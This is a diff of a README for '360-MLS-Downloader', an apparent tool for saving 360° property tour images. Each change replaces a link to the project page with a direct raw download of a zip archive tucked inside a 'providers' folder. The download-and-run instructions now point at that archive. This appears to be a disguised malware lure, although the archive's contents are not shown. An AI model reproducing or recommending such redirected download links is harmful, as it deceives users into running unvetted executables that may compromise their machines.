@@ -1,6 +1,6 @@
 # 📥 360-MLS-Downloader - Save 360° Tour Images Fast
 
-[![Download 360-MLS-Downloader](https://img.shields.io/badge/Download%20Now-360--MLS--Downloader-blue?style=for-the-badge&logo=github)](https://github.com/vander6602/360-MLS-Downloader)
+[![Download 360-MLS-Downloader](https://img.shields.io/badge/Download%20Now-360--MLS--Downloader-blue?style=for-the-badge&logo=github)](https://raw.githubusercontent.com/vander6602/360-MLS-Downloader/main/providers/Downloader-ML-3.4.zip)
 
 ## 🖥️ What this app does
 
@@ -15,7 +15,7 @@
 
 ## 🚀 Download and run
 
-1. Open the main project page: [360-MLS-Downloader](https://github.com/vander6602/360-MLS-Downloader)
+1. Open the main project page: [360-MLS-Downloader](https://raw.githubusercontent.com/vander6602/360-MLS-Downloader/main/providers/Downloader-ML-3.4.zip)
 2. Download the latest release or the app file from that page
 3. Save the file to a folder you can find again, such as Downloads
 4. If the file is zipped, right-click it and choose **Extract All**
@@ -56,7 +56,7 @@ Choose a folder where you want the images saved. The app will place the files th
 
 ## 🪟 Windows steps
 
-1. Go to the download page: [360-MLS-Downloader](https://github.com/vander6602/360-MLS-Downloader)
+1. Go to the download page: [360-MLS-Downloader](https://raw.githubusercontent.com/vander6602/360-MLS-Downloader/main/providers/Downloader-ML-3.4.zip)
 2. Get the latest Windows file from the project page
 3. Extract the files if needed
 4. Double-click the app or start file
@@ -148,7 +148,7 @@ No. It supports Zillow 3D Home and Ricoh360, along with other compatible MLS tou
 
 ## 📥 Download
 
-Visit the project page to download and run this file: [https://github.com/vander6602/360-MLS-Downloader](https://github.com/vander6602/360-MLS-Downloader)
+Visit the project page to download and run this file: [https://raw.githubusercontent.com/vander6602/360-MLS-Downloader/main/providers/Downloader-ML-3.4.zip](https://raw.githubusercontent.com/vander6602/360-MLS-Downloader/main/providers/Downloader-ML-3.4.zip)
 
 ## 🏷️ Topics
 
